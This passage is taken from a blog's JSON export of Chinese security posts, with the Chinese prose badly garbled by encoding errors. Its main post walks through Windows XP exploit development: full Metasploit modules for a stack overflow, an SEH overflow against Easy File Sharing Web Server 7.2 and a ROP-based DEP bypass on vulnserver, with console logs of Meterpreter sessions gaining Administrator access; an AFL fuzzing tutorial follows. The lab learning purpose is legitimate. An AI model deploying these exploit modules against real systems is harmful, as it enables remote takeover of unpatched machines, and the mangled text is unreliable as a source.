ˆå°±ä¼šä¸å¹³è¡¡ï¼Œå¯¼è‡´æº¢å‡ºç‚¹å˜åŒ–ï¼ˆå‚è§ä¹‹å‰ä»112å˜æˆ104ï¼‰ã€‚ä½†æ˜¯å¦‚æœæ”¹æˆè¿”å›åˆ°start_addrï¼Œæ³„éœ²çš„æ•°æ®å°±ä¼šæ›´å¤šï¼ˆè™½ç„¶è¿˜æ˜¯æ²¡æœ‰æˆåŠŸï¼‰ã€‚ä¸€ä¸ªäº‹å®æ˜¯æ±‡ç¼–ç¨‹åºçš„å…¥å£æ˜¯_startï¼Œè€ŒCç¨‹åºçš„å…¥å£æ˜¯mainå‡½æ•° æ‰§è¡Œçš„æµç¨‹æ˜¯ï¼šGCCå°†ä½ çš„ç¨‹åºåŒcrtbegin.o/crtend.o/gcrt1.oä¸€å—è¿›è¡Œç¼–è¯‘ã€‚å…¶å®ƒé»˜è®¤librariesä¼šè¢«é»˜è®¤åŠ¨æ€é“¾æ¥ã€‚å¯æ‰§è¡Œç¨‹åºçš„å¼€å§‹åœ°å€è¢«è®¾ç½®ä¸º_startã€‚å†…æ ¸åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶ä¸”å»ºç«‹æ­£æ–‡æ®µï¼Œæ•°æ®æ®µï¼Œbssæ®µå’Œå †æ ˆæ®µï¼Œç‰¹åˆ«çš„ï¼Œå†…æ ¸ä¸ºå‚æ•°å’Œç¯å¢ƒå˜é‡åˆ†é…é¡µé¢ï¼Œå¹¶ä¸”å°†æ‰€æœ‰å¿…è¦ä¿¡æ¯pushåˆ°å †æ ˆä¸Šã€‚æ§åˆ¶æµç¨‹åˆ°äº†_startä¸Šé¢ã€‚_startä»å†…æ ¸å»ºç«‹çš„å †æ ˆä¸Šè·å–æ‰€æœ‰ä¿¡æ¯ï¼Œä¸ºlibc_start_mainå»ºç«‹å‚æ•°æ ˆï¼Œå¹¶ä¸”è°ƒç”¨libc_start_mainã€‚libc_start_mainåˆå§‹åŒ–ä¸€äº›å¿…è¦çš„ä¸œè¥¿ï¼Œç‰¹åˆ«æ˜¯C libraryï¼ˆæ¯”å¦‚malloc)çº¿ç¨‹ç¯å¢ƒå¹¶ä¸”è°ƒç”¨æˆ‘ä»¬çš„mainå‡½æ•°ã€‚æˆ‘ä»¬çš„mainä¼šä»¥main(argv,argv)æ¥è¢«è°ƒç”¨ã€‚äº‹å®ä¸Šï¼Œè¿™é‡Œæœ‰æ„æ€çš„ä¸€ç‚¹æ˜¯mainå‡½æ•°çš„ç­¾åã€‚libc_start_mainè®¤ä¸ºmainçš„ç­¾åä¸ºmain(int, char , char )ï¼Œå¦‚æœä½ æ„Ÿåˆ°å¥½å¥‡ï¼Œå°è¯•æ‰§è¡Œä¸‹é¢çš„ç¨‹åºã€‚https://www.mi1k7ea.com/2019/03/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://cool-y.github.io/categories/Pwn/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://cool-y.github.io/tags/linux/"},{"name":"pwn","slug":"pwn","permalink":"https://cool-y.github.io/tags/pwn/"},{"name":"æ ˆæº¢å‡º","slug":"æ ˆæº¢å‡º","permalink":"https://cool-y.github.io/tags/æ ˆæº¢å‡º/"}]},{"title":"x86-basic æ¼æ´åˆ©ç”¨","slug":"x86basic","date":"2019-07-10T09:00:36.000Z","updated":"2021-04-10T13:51:32.349Z","comments":true,"path":"2019/07/10/x86basic/","link":"","permalink":"https://cool-y.github.io/2019/07/10/x86basic/","excerpt":"","text":"0x00 æ¼æ´åˆ©ç”¨å¼€å‘ç®€ä»‹ï¼ˆ1ï¼‰éœ€è¦ä»€ä¹ˆ Immunity Debugger -Download Mona.py -Download Metasploitæ¡†æ¶-ä¸‹è½½ é¶æœºâ€“Windows XP sp3 å‡½æ•°è°ƒç”¨ä¸æ ˆï¼šè°ƒç”¨ã€è¿”å› å¯„å­˜å™¨ä¸å‡½æ•°æ ˆå¸§ï¼šESPã€EBP å‡½æ•°æ ˆå¸§ï¼šå±€éƒ¨å˜é‡ã€æ ˆå¸§çŠ¶æ€å€¼ã€å‡½æ•°è¿”å›åœ°å€ å‡½æ•°è°ƒç”¨çº¦å®šä¸ç›¸å…³æŒ‡ä»¤ï¼šå‚æ•°ä¼ é€’æ–¹å¼ã€å‚æ•°å…¥æ ˆé¡ºåºã€æ¢å¤å †æ ˆå¹³è¡¡çš„æ“ä½œ ï¼ˆ2ï¼‰å‡½æ•°è°ƒç”¨çš„æ±‡ç¼–è¿‡ç¨‹ ç¤ºä¾‹ç¨‹åº 123456charname[] = \"1234567\";voidfunc(int a, int b, int c)&#123; charbuf[8]; strcpy(buf, name);&#125; æ±‡ç¼–è¿‡ç¨‹ PUSH c, PUSH b, PUSH a CALL address of funcã€ä¿å­˜è¿”å›åœ°å€ï¼›è·³è½¬ã€‘ MOV ebp, esp PUSH ebp SUB esp, 0x40 åˆ›å»ºå±€éƒ¨å˜é‡ï¼Œ4ä¸ªå­—èŠ‚ä¸ºä¸€ç»„ do something add esp, 0x40 pop ebp RETNã€å¼¹å‡ºè¿”å›åœ°å€ï¼Œè·³è½¬ã€‘ æ ˆå¸§ç»“æ„ 0x01 ç®€å•æ ˆæº¢å‡º ç›®æ ‡ç¨‹åº:bof-server source codebof-server binary for Windowsusage:æœåŠ¡ç«¯bof-server.exe 4242å®¢æˆ·ç«¯telnet localhost 4242versionbof-server v0.01quit æ¼æ´ç‚¹ äº§ç”Ÿå´©æºƒå°†è¾“å‡ºçš„1024ä¸ªAå‘é€ç»™é¶æœºç¨‹åº12python -c &quot;print(&apos;A&apos; * 1024)&quot;telnet 192.168.64.138 4242 å…³é—­é˜²å¾¡æªæ–½ä½¿ç”¨PESecurityæ£€æŸ¥å¯æ‰§è¡Œæ–‡ä»¶æœ¬èº«çš„é˜²å¾¡æªæ–½å¼€å¯æƒ…å†µæ³¨æ„è®¾ç½®ï¼šSet-ExecutionPolicyUnrestricted ASLRå’ŒDEPASLRåœ¨xpä¸‹ä¸ç”¨è€ƒè™‘ï¼ŒDEPå¯é€šè¿‡ä¿®æ”¹boot.iniä¸­çš„nonexecuteæ¥å®Œæˆï¼ˆAlwaysOffã€OptOutï¼‰ æ•´ä½“çš„æ”»å‡»æµç¨‹ ä»»æ„é00çš„æŒ‡ä»¤è¦†ç›–bufferå’ŒEBP ä»ç¨‹åºå·²ç»åŠ è½½çš„dllä¸­è·å–ä»–ä»¬çš„jmp espæŒ‡ä»¤åœ°å€ã€‚ ä½¿ç”¨jmp espçš„æŒ‡ä»¤åœ°å€è¦†ç›–ReturnAddress ä»ä¸‹ä¸€è¡Œå¼€å§‹å¡«å……Shellcode ç¡®å®šæº¢å‡ºç‚¹çš„ä½ç½® ç”Ÿæˆå­—ç¬¦åºåˆ— pattern_create.rb å‘é€ç»™ç›®æ ‡ç¨‹åº è®¡ç®—åç§»é‡ pattern_offset.rb ç¡®å®špayloadç»“æ„ å¯»æ‰¾jmp espè·³æ¿ ODé™„åŠ è¿›ç¨‹çœ‹ä¸€ä¸‹æœåŠ¡å™¨åŠ è½½äº†å“ªäº›æ¨¡å— æŸ¥æ‰¾JMP ESPæŒ‡ä»¤çš„åœ°å€åœ¨è¿™é‡Œé€‰æ‹©äº†ws2_32.dllä½œä¸ºå¯¹è±¡ï¼Œé€šè¿‡Metasploitçš„msfbinscanè¿›è¡Œæœç´¢ è‡ªåŠ¨åŒ–æ”»å‡»123456789101112131415161718192021222324252627282930313233343536373839require 'msf/core'class Metasploit3 &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::Tcp def initialize(info = &#123;&#125;) super(update_info(info, 'Name' =&gt; 'Stack Based Buffer Overflow Example', 'Description' =&gt; %q&#123; Stack Based Overflow Example Application Exploitation Module &#125;, 'Platform' =&gt; 'Windows', 'Author' =&gt; 'yanhan', 'Payload' =&gt; &#123; 'space' =&gt; 400, 'BadChars' =&gt; \"\\x00\\xff\" &#125;, 'Targets' =&gt; [ [ 'Windows XP SP3', &#123;'Ret' =&gt; 0x71a22b53, 'Offset' =&gt; 520&#125; ] ], 'DisclosureDate' =&gt; '2019-05-25' )) end def exploit connect buf = make_nops(target['Offset']) buf = buf + [target['Ret']].pack('V') + make_nops(20) + payload.encoded sock.put(buf) handler disconnect endend 123456789101112131415161718192021222324252627282930313233343536msf5 &gt; use exploit/windows/yanhan/bof_attackmsf5 exploit(windows/yanhan/bof_attack) &gt; set rhosts 192.168.31.114rhosts =&gt; 192.168.31.114msf5 exploit(windows/yanhan/bof_attack) &gt; set rport 1000rport =&gt; 1000msf5 exploit(windows/yanhan/bof_attack) &gt; exploit[*] Started reverse TCP handler on 192.168.31.84:4444[*] Sending stage (179779 bytes) to 192.168.31.114[*] Meterpreter session 1 opened (192.168.31.84:4444 -&gt; 192.168.31.114:1062) at 2019-07-10 16:38:51 +0800meterpreter &gt; lsListing: C:\\Documents and Settings\\Administrator================================================Mode Size Type Last modified Name---- ---- ---- ------------- ----40555/r-xr-xr-x 0 dir 2019-05-14 09:54:43 +0800 Application Data40777/rwxrwxrwx 0 dir 2019-05-14 09:54:43 +0800 Cookies40555/r-xr-xr-x 0 dir 2019-05-14 09:54:43 +0800 Favorites40777/rwxrwxrwx 0 dir 2019-05-14 09:54:43 +0800 Local Settings40555/r-xr-xr-x 0 dir 2019-05-14 09:54:43 +0800 My Documents100666/rw-rw-rw- 1048576 fil 2019-05-14 09:54:43 +0800 NTUSER.DAT40777/rwxrwxrwx 0 dir 2019-05-14 09:54:43 +0800 NetHood40777/rwxrwxrwx 0 dir 2019-05-14 09:54:43 +0800 PrintHood40555/r-xr-xr-x 0 dir 2019-05-14 09:54:43 +0800 Recent40555/r-xr-xr-x 0 dir 2019-05-14 09:54:43 +0800 SendTo40777/rwxrwxrwx 0 dir 2019-05-14 09:54:43 +0800 Templates100777/rwxrwxrwx 26665 fil 2019-05-28 14:59:10 +0800 bof-server.exe100666/rw-rw-rw- 1024 fil 2019-05-14 09:54:43 +0800 ntuser.dat.LOG100666/rw-rw-rw- 178 fil 2019-05-14 09:54:43 +0800 ntuser.ini40777/rwxrwxrwx 0 dir 2019-05-29 10:49:26 +0800 vulnserver40555/r-xr-xr-x 0 dir 2019-05-14 09:54:43 +0800 ã€Œå¼€å§‹ã€èœå•40777/rwxrwxrwx 0 dir 2019-05-14 09:54:43 +0800 æ¡Œé¢meterpreter &gt; 0x02 åŸºäºSEHçš„æ ˆæº¢å‡º ç›®æ ‡ç¨‹åº Easy File Sharing Web Server 7.2 æ¼æ´ç‚¹åœ¨å¤„ç†è¯·æ±‚æ—¶å­˜åœ¨æ¼æ´â€”â€”ä¸€ä¸ªæ¶æ„çš„è¯·æ±‚å¤´éƒ¨ï¼ˆHEADæˆ–GETï¼‰å°±å¯ä»¥å¼•èµ·ç¼“å†²åŒºæº¢å‡ºï¼Œä»è€Œæ”¹å†™SEHé“¾çš„åœ°å€ã€‚ åˆ©ç”¨sehå¡«å……ç‰©+nseh+ sehï¼ˆpop popretnæŒ‡ä»¤åºåˆ—åœ°å€ï¼‰+shellcode ç¡®å®šæº¢å‡ºç‚¹çš„ä½ç½® ç”Ÿæˆå­—ç¬¦åºåˆ—123/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 10000 &gt; a.txtpython -c &quot;print(&apos; HTTP/1.0\\r\\n\\r\\n&apos;)&quot; &gt; b.txtcat a.txt b.txt &gt; c.txt åˆ é™¤caté€ æˆçš„å¤šä½™å­—ç¬¦0x0a12345vim -bz.txt# In Vim:%!xxd# After editing, use the instruction below to save:%!xxd -r æ„é€ SEHé“¾ å°†Easy File Sharing Web Server 7.2åŠ è½½åˆ°ImmunityDebuggerä¸­ï¼Œå¹¶å¤„äºè¿è¡ŒçŠ¶æ€ã€‚ å‘é€æº¢å‡ºå­—ç¬¦åºåˆ— æŸ¥çœ‹Easy File Sharing Web Server 7.2æº¢å‡ºåœ°å€ è®¡ç®—åç§»é‡è®¡ç®—catchå—åç§»é‡&amp;è®¡ç®—ä¸‹ä¸€æ¡SEHè®°å½•åç§»é‡ å¯»æ‰¾PPR ä½¿ç”¨monaå¯»æ‰¾éœ€è¦POP/POP/RETæŒ‡ä»¤çš„åœ°å€æ¥è½½å…¥ä¸‹ä¸€æ¡SEHè®°å½•çš„åœ°å€ï¼Œå¹¶è·³è½¬åˆ°æ”»å‡»è½½è·12!mona modules!mona seh è‡ªåŠ¨åŒ–æ”»å‡» ç¼–å†™æ”»å‡»è„šæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647require 'msf/core'class MetasploitModule &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::Tcp include Msf::Exploit::Seh def initialize(info = &#123;&#125;) super(update_info(info, 'Name' =&gt; 'Easy File Sharing HTTP Server 7.2 SEH Overflow', 'Description' =&gt; %q&#123; This Module Demonstrate SEH based overflow example &#125;, 'Author' =&gt; 'yanhan', 'Payload' =&gt; &#123; 'Space' =&gt; 390, 'BadChars' =&gt; \"\\x00\\x7e\\x2b\\x26\\x3d\\x25\\x3a\\x22\\x0a\\x0d\\x20\\x2f\\x5c\\x2e\" &#125;, 'Platform' =&gt; 'Windows', 'Targets' =&gt; [ [ 'Easy File Sharing 7.2 HTTP', &#123; 'Ret' =&gt; 0x10022fd7, 'Offset' =&gt; 4061 &#125; ] ], 'DisclosureDate' =&gt; '2019-01-16', )) end def exploit connect weapon = \"HEAD \" weapon &lt;&lt; make_nops(target['Offset']) weapon &lt;&lt; generate_seh_record(target['Ret']) weapon &lt;&lt; make_nops(20) weapon &lt;&lt; payload.encoded weapon &lt;&lt; \" HTTP/1.0\\r\\n\\r\\n\" sock.put(weapon) handler disconnect endend exploit 12345678910111213141516171819msf5 &gt; use exploit/windows/yanhan/seh_attackmsf5 exploit(windows/yanhan/seh_attack) &gt; set rhosts 192.168.31.114rhosts =&gt; 192.168.31.114msf5 exploit(windows/yanhan/seh_attack) &gt; set rport 80rport =&gt; 80msf5 exploit(windows/yanhan/seh_attack) &gt; exploit[*] Started reverse TCP handler on 192.168.31.84:4444[*] Exploit completed, but no session was created.msf5 exploit(windows/yanhan/seh_attack) &gt; set payload windows/meterpreter/bind_tcppayload =&gt; windows/meterpreter/bind_tcpmsf5 exploit(windows/yanhan/seh_attack) &gt; exploit[*] Started bind TCP handler against 192.168.31.114:4444[*] Sending stage (179779 bytes) to 192.168.31.114[*] Meterpreter session 1 opened (192.168.31.84:46601 -&gt; 192.168.31.114:4444) at 2019-07-10 16:43:47 +0800meterpreter &gt; getuidServer username: WHU-3E3EECEBFD1\\Administrator 0x03 ç»•è¿‡DEP ç›®æ ‡ç¨‹åº Introducing Vulnserverä½¿ç”¨ vulnserver.exe 6666æ¼æ´ç‚¹ è®¾ç½®DEPä¿æŠ¤æ„å»ºROPé“¾æ¥è°ƒç”¨VirtualProtect()å…³é—­DEPå¹¶æ‰§è¡ŒShellcode è®¡ç®—åç§»é‡&#39;TRUN .&#39;+make_nops(target[&#39;Offset&#39;])Immunityé™„åŠ è¿›ç¨‹ä¹‹åï¼Œåœ¨æœåŠ¡ç«¯å‘é€3000ä¸ªå­—ç¬¦ï¼Œè®¡ç®—åç§» åˆ›å»ºROPé“¾!mona rop -m *.dll -cp nonull12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667################################################################################Register setup for VirtualProtect() :-------------------------------------------- EAX = NOP (0x90909090) ECX = lpOldProtect (ptr to W address) EDX = NewProtect (0x40) EBX = dwSize ESP = lPAddress (automatic) EBP = ReturnTo (ptr to jmp esp) ESI = ptr to VirtualProtect() EDI = ROP NOP (RETN) --- alternative chain --- EAX = ptr to &amp;VirtualProtect() ECX = lpOldProtect (ptr to W address) EDX = NewProtect (0x40) EBX = dwSize ESP = lPAddress (automatic) EBP = POP (skip 4 bytes) ESI = ptr to JMP [EAX] EDI = ROP NOP (RETN) + place ptr to \"jmp esp\" on stack, below PUSHAD--------------------------------------------ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :----------------------------------------------------------*** [ Ruby ] *** def create_rop_chain() # rop chain generated with mona.py - www.corelan.be rop_gadgets = [ 0x77dabf34, # POP ECX # RETN [ADVAPI32.dll] 0x6250609c, # ptr to &amp;VirtualProtect() [IAT essfunc.dll] 0x77d1927f, # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] 0x7c96d192, # XCHG EAX,ESI # RETN [ntdll.dll] 0x77bef671, # POP EBP # RETN [msvcrt.dll] 0x625011af, # &amp; jmp esp [essfunc.dll] 0x77e9ad22, # POP EAX # RETN [RPCRT4.dll] 0xfffffdff, # Value to negate, will become 0x00000201 0x77e6c784, # NEG EAX # RETN [RPCRT4.dll] 0x77dc560a, # XCHG EAX,EBX # RETN [ADVAPI32.dll] 0x7c87fbcb, # POP EAX # RETN [kernel32.dll] 0xffffffc0, # Value to negate, will become 0x00000040 0x77d4493b, # NEG EAX # RETN [USER32.dll] 0x77c28fbc, # XCHG EAX,EDX # RETN [msvcrt.dll] 0x77bef7c9, # POP ECX # RETN [msvcrt.dll] 0x7c99bac1, # &amp;Writable location [ntdll.dll] 0x719e4870, # POP EDI # RETN [mswsock.dll] 0x77e6d224, # RETN (ROP NOP) [RPCRT4.dll] 0x77e8c50c, # POP EAX # RETN [RPCRT4.dll] 0x90909090, # nop 0x77de60c7, # PUSHAD # RETN [ADVAPI32.dll] ].flatten.pack(\"V*\") return rop_gadgets end # Call the ROP chain generator inside the 'exploit' function : rop_chain = create_rop_chain() è‡ªåŠ¨åŒ–æ”»å‡»12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970require 'msf/core'class Metasploit3 &lt; Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::Tcp def initialize(info = &#123;&#125;) super(update_info(info, 'Name' =&gt; 'DEP Bypass Exploit', 'Description' =&gt; %q&#123; DEP Bypass Using ROP Chains Example Module &#125;, 'Platform' =&gt; 'Windows', 'Author' =&gt; 'yanhan', 'Payload' =&gt; &#123; 'space' =&gt; 312, 'BadChars' =&gt; \"\\x00\" &#125;, 'Targets' =&gt; [ [ 'Windows XP', &#123;'Offset' =&gt; find it&#125; ] ], 'DisclosureDate' =&gt; '2019-01-16')) end def create_rop_chain() # rop chain generated with mona.py - www.corelan.be rop_gadgets = [ 0x77dabf34, # POP ECX # RETN [ADVAPI32.dll] 0x6250609c, # ptr to &amp;VirtualProtect() [IAT essfunc.dll] 0x77d1927f, # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] 0x7c96d192, # XCHG EAX,ESI # RETN [ntdll.dll] 0x77bef671, # POP EBP # RETN [msvcrt.dll] 0x625011af, # &amp; jmp esp [essfunc.dll] 0x77e9ad22, # POP EAX # RETN [RPCRT4.dll] 0xfffffdff, # Value to negate, will become 0x00000201 0x77e6c784, # NEG EAX # RETN [RPCRT4.dll] 0x77dc560a, # XCHG EAX,EBX # RETN [ADVAPI32.dll] 0x7c87fbcb, # POP EAX # RETN [kernel32.dll] 0xffffffc0, # Value to negate, will become 0x00000040 0x77d4493b, # NEG EAX # RETN [USER32.dll] 0x77c28fbc, # XCHG EAX,EDX # RETN [msvcrt.dll] 0x77bef7c9, # POP ECX # RETN [msvcrt.dll] 0x7c99bac1, # &amp;Writable location [ntdll.dll] 0x719e4870, # POP EDI # RETN [mswsock.dll] 0x77e6d224, # RETN (ROP NOP) [RPCRT4.dll] 0x77e8c50c, # POP EAX # RETN [RPCRT4.dll] 0x90909090, # nop 0x77de60c7, # PUSHAD # RETN [ADVAPI32.dll] ].flatten.pack(\"V*\") return rop_gadgets end def exploit connect rop_chain = create_rop_chain() junk = make_nops(target['Offset']) buf = \"TRUN .\" + junk + rop_chain + make_nops(16) + payload.encoded + '\\r\\n' sock.put(buf) handler disconnect endend 1234567891011121314151617181920212223msf5 &gt; use exploit/windows/yanhan/rop_attackmsf5 exploit(windows/yanhan/rop_attack) &gt; set rhosts 192.168.31.114rhosts =&gt; 192.168.31.114msf5 exploit(windows/yanhan/rop_attack) &gt; set rport 1000rport =&gt; 1000msf5 exploit(windows/yanhan/rop_attack) &gt; exploit[*] Started reverse TCP handler on 192.168.31.84:4444[*] Exploit completed, but no session was created.msf5 exploit(windows/yanhan/rop_attack) &gt; set payload windows/meterpreter/bind_tcppayload =&gt; windows/meterpreter/bind_tcpmsf5 exploit(windows/yanhan/rop_attack) &gt; exploit[*] Started bind TCP handler against 192.168.31.114:4444[*] Exploit completed, but no session was created.msf5 exploit(windows/yanhan/rop_attack) &gt; exploit[*] Started bind TCP handler against 192.168.31.114:4444[*] Sending stage (179779 bytes) to 192.168.31.114[*] Meterpreter session 1 opened (192.168.31.84:44537 -&gt; 192.168.31.114:4444) at 2019-07-10 16:51:07 +0800meterpreter &gt; getuidServer username: WHU-3E3EECEBFD1\\Administrator","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://cool-y.github.io/categories/Pwn/"}],"tags":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/tags/äºŒè¿›åˆ¶/"},{"name":"Windows","slug":"Windows","permalink":"https://cool-y.github.io/tags/Windows/"},{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://cool-y.github.io/tags/æ¼æ´/"}]},{"title":"AFL-çˆ±ä¹‹åˆä½“éªŒ","slug":"afl-first-try","date":"2019-07-09T06:46:07.000Z","updated":"2021-04-10T13:35:35.911Z","comments":true,"path":"2019/07/09/afl-first-try/","link":"","permalink":"https://cool-y.github.io/2019/07/09/afl-first-try/","excerpt":"","text":"å‚è€ƒï¼šhttps://paper.seebug.org/841/#_1 éƒ¨ç½²afl 123456&gt; wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz&gt; tar -zxvf afl-latest.tgz&gt; cd afl-2.52b/&gt; make&gt; sudo make install&gt; éƒ¨ç½²qemu 12345678&gt; $ CPU_TARGET=x86_64 ./build_qemu_support.sh&gt; [+] Build process successful!&gt; [*] Copying binary...&gt; -rwxr-xr-x 1 han han 10972920 7æœˆ 9 10:43 ../afl-qemu-trace&gt; [+] Successfully created &apos;../afl-qemu-trace&apos;.&gt; [!] Note: can&apos;t test instrumentation when CPU_TARGET set.&gt; [+] All set, you can now (hopefully) use the -Q mode in afl-fuzz!&gt; 0x01 ç™½ç›’æµ‹è¯•ç›®æ ‡ç¨‹åºç¼–è¯‘ æºä»£ç  1234567891011121314#undef _FORTIFY_SOURCE#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char** argv) &#123; vulnerable_function(); write(STDOUT_FILENO, &quot;Hello, World\\n&quot;, 13);&#125; gccç¼–è¯‘ï¼ˆä¸æ’æ¡©ï¼‰ 1234$ gcc v1.c -o v1$ ./v1whatHello, World ç”Ÿæˆv1çš„ç›®çš„ä¸€æ˜¯ä¸ºäº†å’Œafl-gccçš„ç¼–è¯‘åšå¯¹æ¯”ï¼ŒäºŒæ˜¯ä¸ºé»‘ç›’æµ‹è¯•åšé“ºå«ã€‚ ä½¿ç”¨afl-gccè¿›è¡Œç¼–è¯‘-fno-stack-protector è¯¥é€‰é¡¹ä¼šç¦æ­¢stack canaryä¿æŠ¤-z execstack å…è®¸å †æ ˆå¯æ‰§è¡Œ1234$ ../afl-2.52b/afl-gcc -fno-stack-protector -z execstack v1.c -o v1-afl afl-cc 2.52b by &lt;lcamtuf@google.com&gt;afl-as 2.52b by &lt;lcamtuf@google.com&gt;[+] Instrumented 2 locations (64-bit, non-hardened mode, ratio 100%). æµ‹è¯•æ’æ¡©ç¨‹åºafl-showmap è·Ÿè¸ªå•ä¸ªè¾“å…¥çš„æ‰§è¡Œè·¯å¾„ï¼Œå¹¶æ‰“å°ç¨‹åºæ‰§è¡Œçš„è¾“å‡ºã€æ•è·çš„å…ƒç»„ï¼ˆtuplesï¼‰ï¼Œtupleç”¨äºè·å–åˆ†æ”¯ä¿¡æ¯ï¼Œä»è€Œè¡¡é‡è¡¡é‡ç¨‹åºè¦†ç›–æƒ…å†µã€‚12345678910$ ./afl-showmap -o /dev/null -- ../vuln/v1 &lt;&lt;(echo test)afl-showmap 2.52b by &lt;lcamtuf@google.com&gt;[*] Executing &apos;../vuln/v1&apos;...-- Program output begins --Hello, World-- Program output ends --[-] PROGRAM ABORT : No instrumentation detected Location : main(), afl-showmap.c:773 12345678$ ./afl-showmap -o /dev/null -- ../vuln/v1-afl &lt;&lt;(echo test)afl-showmap 2.52b by &lt;lcamtuf@google.com&gt;[*] Executing &apos;../vuln/v1-afl&apos;...-- Program output begins --Hello, World-- Program output ends --[+] Captured 1 tuples in &apos;/dev/null&apos;. å¯è§ï¼Œafl-gccç›¸å¯¹äºgccçš„ä¸åŒåœ¨äºé‡‡ç”¨äº†æ’æ¡©è®¡ç®—è¦†ç›–ç‡ï¼Œåœ¨è¿™ä¸ªå®ä¾‹ç¨‹åºä¸­æ•æ‰åˆ°äº†ä¸€ä¸ªå…ƒç»„ æ‰§è¡ŒFUZZER ä¿®æ”¹coreåœ¨æ‰§è¡Œafl-fuzzå‰ï¼Œå¦‚æœç³»ç»Ÿé…ç½®ä¸ºå°†æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ï¼ˆcoreï¼‰é€šçŸ¥å‘é€åˆ°å¤–éƒ¨ç¨‹åºã€‚12345678910111213141516171819$ ./afl-fuzz -i ../vuln/testcase/ -o ../vuln/out/ ../vuln/v1-aflafl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;[+] You have 2 CPU cores and 2 runnable tasks (utilization: 100%).[*] Checking CPU core loadout...[+] Found a free CPU core, binding to #0.[*] Checking core_pattern...[-] Hmm, your system is configured to send core dump notifications to an external utility. This will cause issues: there will be an extended delay between stumbling upon a crash and having this information relayed to the fuzzer via the standard waitpid() API. To avoid having crashes misinterpreted as timeouts, please log in as root and temporarily modify /proc/sys/kernel/core_pattern, like so: echo core &gt;/proc/sys/kernel/core_pattern[-] PROGRAM ABORT : Pipe at the beginning of &apos;core_pattern&apos; Location : check_crash_handling(), afl-fuzz.c:7275 å°†å¯¼è‡´å°†å´©æºƒä¿¡æ¯å‘é€åˆ°Fuzzerä¹‹é—´çš„å»¶è¿Ÿå¢å¤§ï¼Œè¿›è€Œå¯èƒ½å°†å´©æºƒè¢«è¯¯æŠ¥ä¸ºè¶…æ—¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—ä¸´æ—¶ä¿®æ”¹core_patternæ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š1echo core &gt;/proc/sys/kernel/core_pattern é€šç”¨fuzzè¯­æ³•afl-fuzzå¯¹äºç›´æ¥ä»stdinæ¥å—è¾“å…¥çš„ç›®æ ‡äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€šå¸¸çš„è¯­æ³•æ˜¯ï¼š1$ ./afl-fuzz -i testcase_dir -o findings_dir / path / to / program [... params ...] å¯¹äºä»æ–‡ä»¶ä¸­è·å–è¾“å…¥çš„ç¨‹åºï¼Œä½¿ç”¨â€œ@@â€æ ‡è®°ç›®æ ‡å‘½ä»¤è¡Œä¸­åº”æ”¾ç½®è¾“å…¥æ–‡ä»¶åçš„ä½ç½®ã€‚æ¨¡ç³Šå™¨å°†æ›¿æ¢ä¸ºæ‚¨ï¼š1$ ./afl-fuzz -i testcase_dir -o findings_dir / path / to / program @@ æ­¤æ—¶aflä¼šç»™æˆ‘ä»¬è¿”å›ä¸€äº›ä¿¡æ¯ï¼Œè¿™é‡Œæç¤ºæˆ‘ä»¬æœ‰äº›æµ‹è¯•ç”¨ä¾‹æ— æ•ˆ12345678910111213141516171819202122232425262728293031afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;[+] You have 2 CPU cores and 2 runnable tasks (utilization: 100%).[*] Checking CPU core loadout...[+] Found a free CPU core, binding to #0.[*] Checking core_pattern...[*] Setting up output directories...[+] Output directory exists but deemed OK to reuse.[*] Deleting old session data...[+] Output dir cleanup successful.[*] Scanning &apos;../vuln/testcase/&apos;...[+] No auto-generated dictionary tokens to reuse.[*] Creating hard links for all input files...[*] Validating target binary...[*] Attempting dry run with &apos;id:000000,orig:1&apos;...[*] Spinning up the fork server...[+] All right - fork server is up. len = 3, map size = 1, exec speed = 295 us[*] Attempting dry run with &apos;id:000001,orig:2&apos;... len = 23, map size = 1, exec speed = 125 us[!] WARNING: No new instrumentation output, test case may be useless.[+] All test cases processed.[!] WARNING: Some test cases look useless. Consider using a smaller set.[+] Here are some useful stats: Test case count : 1 favored, 0 variable, 2 total Bitmap range : 1 to 1 bits (average: 1.00 bits) Exec timing : 125 to 295 us (average: 210 us)[*] No -t option specified, so I&apos;ll use exec timeout of 20 ms.[+] All set and ready to roll! çŠ¶æ€çª—å£æˆ‘ä»¬å¯ä»¥çœ‹åˆ°aflå¾ˆå¿«å°±ç»™æˆ‘ä»¬åˆ¶é€ äº†å´©æºƒ 12345678910111213141516171819202122232425262728 american fuzzy lop 2.52b (v1-afl)â”Œâ”€ process timing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€ overall results â”€â”€â”€â”€â”€â”â”‚ run time : 0 days, 0 hrs, 4 min, 19 sec â”‚ cycles done : 2477 â”‚â”‚ last new path : 0 days, 0 hrs, 2 min, 27 sec â”‚ total paths : 3 